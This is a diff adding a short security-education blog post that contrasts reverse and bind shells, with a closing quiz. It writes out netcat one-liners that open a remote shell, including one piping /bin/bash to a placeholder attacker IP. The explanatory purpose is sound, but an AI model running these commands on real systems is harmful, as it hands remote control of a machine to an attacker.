@@ -1,0 +1,38 @@
+---
+title: "Reverse Shell vs Bind Shell"
+date: '2026-06-10'
+tags: ["Security", "Penetration Testing", "netcat", "shells"]
+excerpt: "One makes the victim connect out to you, the other opens a port on the victim. Reverse and bind shells, and the netcat commands for each."
+type: til
+category: "Security"
+---
+
+# Reverse Shell vs Bind Shell
+
+A reverse shell is simply the victim connecting to the attacker's machine. The attacker listens on a certain port, and the victim connects to it.
+
+Example:
+
+```bash
+# Attacker
+nc -lvnp 4444
+
+# Victim
+nc <attacker_ip> 4444 -e /bin/bash
+```
+
+## Bind shell
+
+Just like when we connect to a server, a bind shell is when the attacker somehow opens up a port on the victim machine and then gains access to their machine.
+
+Example:
+
+```bash
+# Victim
+nc -lvnp 4444 -e /bin/bash
+
+# Attacker
+nc <victim_ip> 4444
+```
+
+<Cloze title="Which shell" color="#00e5ff" text="In a {{reverse}} shell the victim connects out and the attacker listens: nc {{-lvnp}} 4444. In a {{bind}} shell the attacker connects in to a port opened on the victim." />
